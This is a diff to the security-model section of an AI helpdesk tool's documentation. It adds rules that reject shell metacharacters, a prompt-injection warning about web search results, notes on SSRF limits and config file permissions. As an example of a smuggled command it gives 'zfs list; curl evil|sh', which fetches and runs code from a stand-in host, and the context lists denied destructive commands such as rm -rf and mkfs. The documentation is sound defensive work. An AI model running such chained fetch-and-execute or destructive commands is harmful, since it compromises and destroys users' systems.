@@ -176,11 +176,32 @@ SECURITY MODEL
     rm -rf|dd |mkfs|format).
   - exec_access=exec additionally requires the command class in exec_allow
     (D2); empty exec_allow = nothing executes. console = only deny applies.
+    exec_access=exec now also rejects shell metacharacters (; & | ` $( )
+    outright -- only a single, unchained command may run per proposal, so an
+    allowed class ("zfs") cannot be used to smuggle a second, unreviewed
+    command past exec_deny (e.g. "zfs list; curl evil|sh"). Use
+    exec_access=console (arbitrary shell, deny-only) when chained commands
+    are genuinely needed -- grant it only to fully trusted admins.
   - exec_mode=confirm (default): every exec needs the explicit
     "Ausführen" click in the browser. auto only with a tight allow list.
+  - Combining exec_access!=ro with research!=off widens the prompt-injection
+    surface (search results are untrusted DATA that can influence the next
+    proposed command); the Settings page (System > Services > AI Helpdesk)
+    shows a warning banner when both are active at once.
 - Privacy: free (Pollinations) and cloud providers send the question
   (incl. tool-use context) to an external service. Use ollama locally for
   sensitive environments.
+- SSRF guard limitation: endpoint/research_endpoint are checked against
+  literal IP addresses only. A configured hostname that resolves (now or via
+  DNS rebinding later) to a private/link-local/metadata address is NOT
+  caught. These fields are admin-only settings (not end-user input); treat
+  them as trusted-admin-only, not as a hard SSRF guarantee against a
+  malicious hostname.
+- Config file permissions: _cfg/cs-aihelp (api_key/auth_token) is chmod 0600
+  on Unix; on Windows the daemon/Perl now lock the file down via icacls
+  (inheritance disabled, access limited to the running account + built-in
+  Administrators) on every write -- best-effort, non-fatal if icacls is
+  unavailable.
 
 NOTES
 -----
